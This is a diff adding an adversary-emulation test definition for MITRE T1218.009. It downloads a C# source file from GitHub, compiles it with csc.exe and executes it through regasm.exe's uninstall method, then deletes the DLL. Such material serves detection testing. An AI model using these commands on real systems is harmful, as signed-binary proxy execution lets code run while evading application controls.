@@ -1,0 +1,21 @@
+#TechniqueName: Signed Binary Proxy Execution: Regsvcs/Regasm
+#AtomicTestName: Regasm Uninstall Method Call Test
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.009\src\T1218.009.cs) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "PathToAtomicsFolder\T1218.009\src\T1218.009.cs"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1218.009\src\T1218.009.cs) {exit 0} else {exit 1}
+
+
+#commands
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"%tmp%\T1218.009.dll" /target:library PathToAtomicsFolder\T1218.009\src\T1218.009.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U %tmp%\T1218.009.dll
+
+
+#cleanup_commands
+del %tmp%\T1218.009.dll >nul 2>&1
+
